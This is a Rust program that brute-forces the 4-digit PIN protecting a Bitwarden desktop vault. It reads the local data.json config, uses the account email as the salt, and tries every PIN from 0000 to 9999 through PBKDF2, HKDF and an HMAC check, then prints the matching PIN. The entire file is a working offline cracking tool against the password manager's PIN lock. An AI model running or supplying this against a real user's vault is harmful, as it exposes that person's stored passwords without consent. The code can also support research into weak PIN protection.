use std::env;

use base64::Engine;
use hkdf::Hkdf;
use hmac::{Hmac, Mac};
use pbkdf2::{
    password_hash::{PasswordHasher, SaltString},
    Params, Pbkdf2,
};
use rayon::prelude::*;
use serde_json::Value;
use sha2::Sha256;

fn main() {
    println!("Testing 4 digit pins from 0000 to 9999");
    let json: Value = serde_json::from_slice(
        &std::fs::read(format!(
            "{}/Bitwarden/data.json",
            env::var("XDG_CONFIG_HOME").unwrap()
        ))
        .unwrap(),
    )
    .unwrap();
    let email = json[json["activeUserId"].as_str().unwrap()]["profile"]["email"]
        .as_str()
        .unwrap();
    let salt = SaltString::b64_encode(email.as_bytes()).unwrap();

    let encrypted = json[json["activeUserId"].as_str().unwrap()]["settings"]["pinProtected"]
        ["encrypted"]
        .as_str()
        .unwrap();
    let mut split = encrypted.split(".");
    split.next();
    let encrypted = split.next().unwrap();
    let b64dec = base64::engine::general_purpose::STANDARD;

    let mut split = encrypted.split("|");
    let iv = b64dec.decode(split.next().unwrap()).unwrap();
    let ciphertext = b64dec.decode(split.next().unwrap()).unwrap();
    let mac = b64dec.decode(split.next().unwrap()).unwrap();

    let mut data = Vec::with_capacity(iv.len() + ciphertext.len());
    data.extend(iv);
    data.extend(ciphertext);
    if let Some(pin) = (0..=9999)
        .par_bridge()
        .filter_map(|pin| {
            let pin = format!("{pin:04}");
            let password_hash = Pbkdf2
                .hash_password_customized(
                    pin.as_bytes(),
                    None,
                    None,
                    Params {
                        rounds: 100000,
                        output_length: 32,
                    },
                    &salt,
                )
                .unwrap();

            let hkdf = Hkdf::<Sha256>::from_prk(password_hash.hash.unwrap().as_bytes()).unwrap();
            // let mut enc_key = [0; 32];
            let mut mac_key = [0; 32];
            // hkdf.expand(b"enc", &mut enc_key).unwrap();
            hkdf.expand(b"mac", &mut mac_key).unwrap();

            let mut mac_verify = Hmac::<Sha256>::new_from_slice(&mac_key).unwrap();
            mac_verify.update(&data);

            if mac_verify.verify_slice(&mac).is_ok() {
                Some(pin)
            } else {
                None
            }
        })
        .find_any(|_| true)
    {
        println!("Pin found: {pin}");
    } else {
        println!("Pin not found");
    }
}
